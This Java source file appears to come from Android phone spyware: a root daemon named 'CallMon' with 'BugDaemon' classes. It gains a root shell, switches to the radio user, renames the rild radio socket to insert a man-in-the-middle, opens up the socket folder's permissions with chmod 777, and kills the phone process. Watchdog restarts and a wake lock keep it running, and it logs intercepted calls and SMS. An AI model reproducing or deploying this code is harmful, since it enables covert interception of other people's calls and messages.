package com.vvt.callmanager;

import java.io.IOException;
import java.util.HashSet;

import android.content.Context;
import android.database.ContentObserver;
import android.net.Uri;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.os.PowerManager.WakeLock;
import android.os.SystemClock;

import com.fx.daemon.DaemonHelper;
import com.fx.daemon.util.ContentChangeWaitingThread;
import com.fx.daemon.util.CrashReporter;
import com.fx.daemon.util.SyncWait;
import com.fx.daemon.util.WatchingProcess;
import com.fx.pmond.ref.MonitorDaemon;
import com.fx.pmond.ref.MonitorDaemonResource;
import com.fx.pmond.ref.command.RemoteAddProcess;
import com.fx.pmond.ref.command.RemoteRemoveProcess;
import com.fx.socket.RemoteCheckAlive;
import com.fx.socket.RemoteCheckSync;
import com.fx.socket.RemoteSetSync;
import com.fx.socket.RemoteSetSync.SyncData;
import com.fx.socket.SocketCmd;
import com.fx.socket.SocketCmdServer;
import com.vvt.callmanager.ref.BugDaemon;
import com.vvt.callmanager.ref.BugDaemonResource;
import com.vvt.callmanager.ref.Customization;
import com.vvt.callmanager.ref.command.RemoteKillPhone;
import com.vvt.callmanager.ref.command.RemoteResetMitm;
import com.vvt.callmanager.security.FxConfigReader;
import com.vvt.callmanager.std.PhoneServiceWrapper;
import com.vvt.logger.FxLog;
import com.vvt.shell.CannotGetRootShellException;
import com.vvt.shell.LinuxProcess;
import com.vvt.shell.Shell;
import com.vvt.shell.ShellUtil;
import com.vvt.timer.TimerBase;

public class CallMonDaemonMain {

	private static final String TAG = "CallMonDaemonMain";
	
	private static final boolean LOGV = Customization.VERBOSE;
	private static final boolean LOGD = Customization.DEBUG;
	private static final boolean LOGE = Customization.ERROR;
	
	private static Context sContext;
	private static SocketCmdServer sSocketCmdServer;
	private static WakeLock sWakeLock;

	public static void main(String[] args) {
		Thread.setDefaultUncaughtExceptionHandler(new CrashReporter(TAG));
		
		DaemonHelper.initLog(
				BugDaemonResource.LOG_FOLDER, 
				BugDaemonResource.LOG_FILENAME);
		
		if (LOGD) FxLog.d(TAG, "main # ENTER ...");
		
		boolean isRecoveryMode = isRecoveryMode();
		if (isRecoveryMode) {
			if (LOGD) FxLog.d(TAG, "main # RECOVERY MODE ACTIVATED!!");
			startRecovery();
		}
		
		String processName = BugDaemonResource.CallMon.PROCESS_NAME;
		if (ShellUtil.isProcessRunning(processName)) {
			if (LOGD) FxLog.d(TAG, "initialize # Daemon is already running!");
			ShellUtil.killSelf();
			return;
		}
		
		DaemonHelper.setProcessName(processName);
		
		if (LOGD) FxLog.d(TAG, "main # Waiting until the system is ready ...");
		DaemonHelper.waitSystemReady();
		
		if (LOGD) FxLog.d(TAG, "main # Looper.prepare()");
		Looper.prepare();
		
		if (LOGD) FxLog.d(TAG, "main # Create system context");
    	sContext = DaemonHelper.getSystemContext();
    	if (sContext == null) {
			if (LOGE) FxLog.e(TAG, "main # Create SystemContext FAILED!! -> EXIT");
			ShellUtil.killSelf();
			return;
		}
    	
    	if (LOGD) FxLog.d(TAG, "main # Validate dex zip file ...");
		boolean isDexFileValid = FxConfigReader.isBugdValid(
				String.format("%s/%s", 
						BugDaemonResource.EXTRACTING_PATH, 
						BugDaemonResource.DEX_ZIP_FILENAME), 
				String.format("%s/%s", 
						BugDaemonResource.EXTRACTING_PATH, 
						BugDaemonResource.SECURITY_CONFIG_FILE));
		if (! isDexFileValid) {
			if (LOGE) FxLog.e(TAG, "main # Validation FAILED!!");
			ShellUtil.killSelf();
			return;
		}
    	
    	if (acquireWakeLock(sContext)) {
			if (LOGD) FxLog.d(TAG, "main # PARTIAL_WAKE_LOCK acquired!");
		}
		else {
			if (LOGE) FxLog.e(TAG, "main # Acquire WakeLock FAILED!!");
			ShellUtil.killSelf();
			return;
		}
		
    	if (LOGD) FxLog.d(TAG, "main # Prepare server socket ...");
    	boolean isServerSocketCreated = prepareServerSocket();
    	if (! isServerSocketCreated) {
    		if (LOGE) FxLog.e(TAG, "main # Create server socket FAILED!!");
			ShellUtil.killSelf();
			return;
    	}

		if (LOGD) FxLog.d(TAG, "main # Prepare MITM setup");
		if (! prepareMitmSetup()) {
			if (LOGE) FxLog.e(TAG, "main # Setup MITM failed!!");
			ShellUtil.killSelf();
			return;
		}
		
		if (LOGD) FxLog.d(TAG, "main # Start call manager process");
		startCallMgrDaemon();
		
		if (LOGD) FxLog.d(TAG, "main # Waiting until MITM has finished the setup ...");
		waitMitmSetup();
		
		// We try to believe that it will be last forever
		if (LOGD) FxLog.d(TAG, "main # Keep observe when the monitor is startup");
		registerOnMonitoringProcessStartup();
		
		if (LOGD) FxLog.d(TAG, "Synchronize with monitor process");
		syncMonitor();
		
    	FxLog.d(TAG, "main # Start routine task");
    	startRoutineTask();
		
		if (LOGD) FxLog.d(TAG, "main # Notify startup success");
		notifyStartupSuccess();
		
		if (LOGD) FxLog.d(TAG, "main # Looper.loop()");
		Looper.loop();
		
		if (LOGD) FxLog.d(TAG, "main # EXIT ...");
	}
	
	private static boolean isRecoveryMode() {
		boolean isCallMgrRunning = 
				ShellUtil.isProcessRunning(
						BugDaemonResource.CallMgr.PROCESS_NAME);
		
		if (LOGV) FxLog.v(TAG, String.format("main # Is %s running? %s", 
				BugDaemonResource.CallMgr.PROCESS_NAME, isCallMgrRunning));
		
		boolean isCallMonRunning = 
				ShellUtil.isProcessRunning(
						BugDaemonResource.CallMon.PROCESS_NAME);
		
		if (LOGV) FxLog.v(TAG, String.format("main # Is %s running? %s", 
				BugDaemonResource.CallMon.PROCESS_NAME, isCallMonRunning));
		
		return isCallMgrRunning || isCallMonRunning;
	}
	
	private static void startRecovery() {
		if (LOGD) FxLog.d(TAG, "startRecovery # ENTER ...");
		
		if (LOGD) FxLog.d(TAG, "startRecovery # Stop MITM service");
		BugDaemon daemon = new BugDaemon();
		daemon.stopDaemon();
		
		if (LOGD) FxLog.d(TAG, "startRecovery # Wait until the system is ready ...");
		DaemonHelper.waitSystemReady();
		
		if (LOGD) FxLog.d(TAG, "startRecovery # EXIT ...");
	}

	private static boolean prepareMitmSetup() {
		boolean isCallMgrRunning = 
				ShellUtil.isProcessRunning(BugDaemonResource.CallMgr.PROCESS_NAME);
		
		if (LOGD) FxLog.d(TAG, String.format(
				"prepareMitmSetup # Is callmgrd running? %s", isCallMgrRunning));
		
		boolean isPhoneServiceActive = PhoneServiceWrapper.isPhoneServiceActive(sContext);
		if (LOGD) FxLog.d(TAG, String.format(
				"prepareMitmSetup # Is phone service active? %s", isPhoneServiceActive));
		
		if (!isCallMgrRunning && isPhoneServiceActive) {
			if (LOGD) FxLog.d(TAG, "prepareMitmSetup # Setup dummy socket");
			setupDummySocket();
			return true;
		}
		return false;
	}
	
	/**
	 * Start new process in 'radio' mode
	 */
	private static void startCallMgrDaemon() {
		Shell shell = null;
		try {
			shell = Shell.getRootShell();
			shell.exec("su radio");
			shell.exec(BugDaemonResource.CallMgr.STARTUP_SCRIPT_PATH);
			shell.terminate();
		}
		catch (CannotGetRootShellException e) {
			if (LOGE) FxLog.e(TAG, e.toString());
		}
	}
	
	private static void waitMitmSetup() {
		SyncWait syncWait = new SyncWait();
		ContentChangeWaitingThread waitingThread = 
				new ContentChangeWaitingThread(TAG, syncWait, 
						BugDaemonResource.URI_MITM_SETUP_SUCCESS, 60*1000);
		waitingThread.start();
		syncWait.getReady();
	}
	
	private static void registerOnMonitoringProcessStartup() {
		if (sContext != null) {
			ContentObserver observer = new ContentObserver(new Handler()) {
				@Override
				public void onChange(boolean selfChange) {
					if (LOGD) FxLog.d(TAG, "Receive monitor startup notification");
					if (LOGD) FxLog.d(TAG, "Synchronizing ...");
					syncMonitor();
				}
			};
			sContext.getContentResolver().registerContentObserver(
					MonitorDaemonResource.URI_STARTUP_SUCCESS, false, observer);
		}
	}
	
	private static void startRoutineTask() {
		TimerBase timer = new TimerBase() {
			@Override
			public void onTimer() {
				if (LOGV) FxLog.v(TAG, "routineTask # Synchronizing with monitor process");
				syncMonitor();
				
				if (LOGV) FxLog.v(TAG, "routineTask # Handle log file size");
				handleLogFileSize();
			}
		};
		timer.setTimerDurationMs(BugDaemonResource.MONITOR_TIME_INTERVAL);
		timer.start();
	}

	private static void syncMonitor() {
		if (LOGV) FxLog.v(TAG, "syncMonitor # ENTER ...");
		
		boolean isMonitorRunning = 
				ShellUtil.isProcessRunning(
						MonitorDaemonResource.PROCESS_NAME);
		
		if (LOGV) FxLog.v(TAG, String.format(
				"syncMonitor # Is monitor running? %s", isMonitorRunning));
		
		if (! isMonitorRunning) {
			if (LOGD) FxLog.d(TAG, "syncMonitor # Start monitor process");
			MonitorDaemon daemon = new MonitorDaemon();
			Uri startupSuccess = MonitorDaemonResource.URI_STARTUP_SUCCESS;
			DaemonHelper.startProcessAndWait(daemon, TAG, startupSuccess, 30*1000);
		}
		
		boolean isSync = false;
		
		RemoteCheckSync remoteCheckSync = new RemoteCheckSync(
				MonitorDaemonResource.SOCKET_NAME, 
				BugDaemonResource.PACKAGE_NAME);
		try { 
			isSync = remoteCheckSync.execute();
			if (LOGV) FxLog.v(TAG, String.format("syncMonitor # isSync? %s", isSync));
			
			if (! isSync) {
				if (LOGD) FxLog.d(TAG, "syncMonitor # Add watching process");
				addWatchingProcess();
				
				SyncData syncData = new SyncData();
				syncData.setClientPackage(BugDaemonResource.PACKAGE_NAME);
				syncData.setSync(true);
				
				RemoteSetSync remoteSetSync = new RemoteSetSync(
						MonitorDaemonResource.SOCKET_NAME, syncData);
				
				remoteSetSync.execute();
				if (LOGD) FxLog.d(TAG, "syncMonitor # Sync complete");
			}
		}
		catch (IOException e) {
			if (LOGE) FxLog.e(TAG, String.format("syncMonitor # Error: %s", e));
		}
		
		if (LOGV) FxLog.v(TAG, "syncMonitor # EXIT ...");
	}
	
	private static void addWatchingProcess() {
		WatchingProcess watchCallMon = new WatchingProcess();
		watchCallMon.setProcessName(BugDaemonResource.CallMon.PROCESS_NAME);
		watchCallMon.setStartupScriptPath(BugDaemonResource.CallMon.STARTUP_SCRIPT_PATH);
		watchCallMon.setServerName(BugDaemonResource.CallMon.SOCKET_NAME);
		
		// Path of the startup script below is correct, we need to restart bug engine from this file
		WatchingProcess watchCallMgr = new WatchingProcess();
		watchCallMgr.setProcessName(BugDaemonResource.CallMgr.PROCESS_NAME);
		watchCallMgr.setStartupScriptPath(BugDaemonResource.CallMon.STARTUP_SCRIPT_PATH);
		watchCallMgr.setServerName(BugDaemonResource.CallMgr.SOCKET_NAME);
		
		RemoteAddProcess remoteAddCallMon = new RemoteAddProcess(watchCallMon);
		RemoteAddProcess remoteAddCallMgr = new RemoteAddProcess(watchCallMgr);
		try {
			remoteAddCallMon.execute();
			remoteAddCallMgr.execute();
		}
		catch (IOException e) {
			if (LOGE) FxLog.e(TAG, String.format("addWatchingProcess # Error: %s", e));
		}
	}
	
	private static void removeWatchingProcess() {
		RemoteRemoveProcess remoteRemoveCallMgr = 
				new RemoteRemoveProcess(BugDaemonResource.CallMgr.PROCESS_NAME);
		RemoteRemoveProcess remoteRemoveCallMon = 
				new RemoteRemoveProcess(BugDaemonResource.CallMon.PROCESS_NAME);
		try {
			remoteRemoveCallMgr.execute();
			remoteRemoveCallMon.execute();
		}
		catch (IOException e) {
			if (LOGE) FxLog.e(TAG, String.format("removeWatchingProcess # Error: %s", e));
		}
	}
	
	private static boolean acquireWakeLock(Context context) {
		PowerManager powerManager = 
				(PowerManager) context.getSystemService(Context.POWER_SERVICE);
		
		if (sWakeLock == null || !sWakeLock.isHeld()) {
			sWakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, TAG);
			sWakeLock.acquire();
		}
		
		return sWakeLock != null && sWakeLock.isHeld();
	}
	
	private static void handleLogFileSize() {
		String logMainPath = String.format("%s/%s", 
				BugDaemonResource.LOG_FOLDER, 
				BugDaemonResource.LOG_FILENAME);
		
		String logBakPath = String.format("%s.bak", logMainPath);
		
		// Log main
		DaemonHelper.handleLogFileSize(
				DaemonHelper.DEFAULT_LOG_SIZE, logMainPath, logBakPath);
		
		// Log from filter call
		logBakPath = String.format("%s.bak", BugDaemonResource.AT_LOG_CALL_PATH);
		DaemonHelper.handleLogFileSize(
				DaemonHelper.DEFAULT_LOG_SIZE, 
				BugDaemonResource.AT_LOG_CALL_PATH, logBakPath);
		
		// Log from filter SMS
		logBakPath = String.format("%s.bak", BugDaemonResource.AT_LOG_SMS_PATH);
		DaemonHelper.handleLogFileSize(
				DaemonHelper.DEFAULT_LOG_SIZE, 
				BugDaemonResource.AT_LOG_SMS_PATH, logBakPath);
	}

	private static void notifyStartupSuccess() {
		sContext.getContentResolver().notifyChange(
				BugDaemonResource.URI_STARTUP_SUCCESS, null);
	}

	private static boolean prepareServerSocket() {
		if (LOGV) FxLog.v(TAG, "prepareServerSocket # ENTER ...");
		
		boolean isSuccess = false;
		
		try {
			sSocketCmdServer = new SocketCmdServer(TAG, BugDaemonResource.CallMon.SOCKET_NAME) {
				@Override
				public Object process(SocketCmd<?, ?> command) {
					return processCommand(command);
				}
			};
			sSocketCmdServer.start();
			isSuccess = true;
		}
		catch (Exception e) {
			if (LOGE) FxLog.e(TAG, String.format("prepareServerSocket # Error: %s", e));
			if (LOGE) FxLog.e(TAG, "prepareServerSocket # Reboot system ...");
			DaemonHelper.rebootDevice(sContext);
		}
		
		if (LOGV) FxLog.v(TAG, "prepareServerSocket # EXIT ...");
		return isSuccess;
	}
	
	private static Object processCommand(SocketCmd<?, ?> command) {
		if (LOGV) FxLog.v(TAG, "processCommand # ENTER ...");
		
		Object response = null;
		
		if (command instanceof RemoteCheckAlive) {
			if (LOGV) FxLog.v(TAG, "processCommand # Check alive");
			response = true;
		}
		else if (command instanceof RemoteKillPhone) {
			if (LOGD) FxLog.d(TAG, "processCommand # Kill Phone");
			killPhoneProcess();
			response = true;
		}
		else if (command instanceof RemoteResetMitm) {
			if (LOGD) FxLog.d(TAG, "processCommand # Request reset MITM");
			Thread t = new Thread() {
				public void run() {
					resetMitm();
				}
			};
			t.start();
			response = true;
		}
		
		if (LOGV) FxLog.v(TAG, "processCommand # EXIT ...");
		return response;
	}

	private static void killPhoneProcess() {
		
		// Retrieve existing information
		HashSet<LinuxProcess> oldProcs = null;
		while (oldProcs == null || oldProcs.isEmpty()) {
			oldProcs = ShellUtil.findDuplicatedProcess(BugDaemonResource.PROC_ANDROID_PHONE);
			if (oldProcs.isEmpty()) SystemClock.sleep(500);
		}
		if (LOGD) FxLog.d(TAG, String.format("killPhoneProcess # existing pid: %s", oldProcs));
		
		// Kill existing process
		ShellUtil.killProcessByName(BugDaemonResource.PROC_ANDROID_PHONE);
		SystemClock.sleep(500);
		
		// Retrieve updating information
		HashSet<LinuxProcess> newProcs = null;
		while (newProcs == null || newProcs.isEmpty()) {
			newProcs = ShellUtil.findDuplicatedProcess(BugDaemonResource.PROC_ANDROID_PHONE);
			if (newProcs.isEmpty()) SystemClock.sleep(500);
		}
		if (LOGD) FxLog.d(TAG, String.format("killPhoneProcess # new pid: %s", newProcs));
		
		// Verify kill operation
		boolean isKillCompleted = true;
		for (LinuxProcess oldProc : oldProcs) {
			if (oldProc == null || oldProc.pid == null) continue;
			for (LinuxProcess newProc : newProcs) {
				if (newProc == null || newProc.pid == null) continue;
				if (oldProc.pid.equals(newProc.pid)) {
					isKillCompleted = false;
				}
			}
		}
		
		if (LOGD) FxLog.d(TAG, String.format("killPhoneProcess # isKillCompleted: %s", isKillCompleted));
		
		// Kill again if the previous is failed
		if (! isKillCompleted) {
			killPhoneProcess();
		}
	}
	
	private static void resetMitm() {
		if (LOGD) FxLog.d(TAG, "resetMitm # Remove watching processes");
		removeWatchingProcess();
		
		if (sSocketCmdServer != null) {
			if (LOGD) FxLog.d(TAG, "resetMitm # Close command server");
			sSocketCmdServer.closeServer();
		}
		
		try {
			if (LOGD) FxLog.d(TAG, "resetMitm # Cleanup RIL socket");
			BugDaemon.cleanupRilSocket();
		}
		catch (CannotGetRootShellException e) {
			if (LOGE) FxLog.e(TAG, String.format("resetMitm # Error: %s", e.toString()));
		}
		
		if (LOGD) FxLog.d(TAG, "resetMitm # Wait 5 secs before reset ...");
		SystemClock.sleep(5*1000);
		
		while (true) {
			if (LOGD) FxLog.d(TAG, "resetMitm # Run startup script");
			BugDaemon bugDaemon = new BugDaemon();
			try {
				bugDaemon.startDaemon();
			}
			catch (Exception e) {
				if (LOGE) FxLog.e(TAG, String.format("resetMitm # Error: %s", e));
			}
			
			SystemClock.sleep(10*1000);
			if (LOGD) FxLog.d(TAG, "resetMitm # This process haven't been killed yet -> run the script again ...");
			// TODO This logics once failed and keep looping
		}
	}
	
	private static void setupDummySocket() {
		if (LOGD) FxLog.d(TAG, "setupDummySocket # ENTER ...");
		
		try {
			Shell shell = Shell.getRootShell();
			String lsRild = shell.exec(String.format("%s %s", 
					Shell.CMD_LS, BugDaemonResource.RIL_SOCKET_ORIGINAL_PATH));
			String lsRildr = shell.exec(String.format("%s %s", 
					Shell.CMD_LS, BugDaemonResource.RIL_SOCKET_RENAMED_PATH));
			
			boolean foundRild = !lsRild.contains("No such file");
			boolean foundRildr = !lsRildr.contains("No such file");
			
			if (!foundRild && !foundRildr) {
				if (LOGD) FxLog.d(TAG, "setupDummySocket # Sockets not found!! -> EXIT ...");
				shell.terminate();
				return;
			}
			
			if (foundRild) {
				if (foundRildr) {
					shell.exec(String.format("rm %s", 
							BugDaemonResource.RIL_SOCKET_RENAMED_PATH));
					if (LOGD) FxLog.d(TAG, "setupDummySocket # rildr socket is removed!!");
				}
				shell.exec(String.format("mv %s %s", 
						BugDaemonResource.RIL_SOCKET_ORIGINAL_PATH, 
						BugDaemonResource.RIL_SOCKET_RENAMED_PATH));
				
				if (LOGD) FxLog.d(TAG, "setupDummySocket # rild socket is renamed");
			}
			shell.exec(String.format("chmod 777 %s", BugDaemonResource.SOCKET_PATH));
			if (LOGD) FxLog.d(TAG, "setupDummySocket # permission of socket folder is modified");
			shell.terminate();
		}
		catch(Exception e) {
			if (LOGE) FxLog.e(TAG, String.format("setupDummySocket # Error: %s", e));
		}
		
		if (LOGD) FxLog.d(TAG, "setupDummySocket # EXIT ...");
	}
}
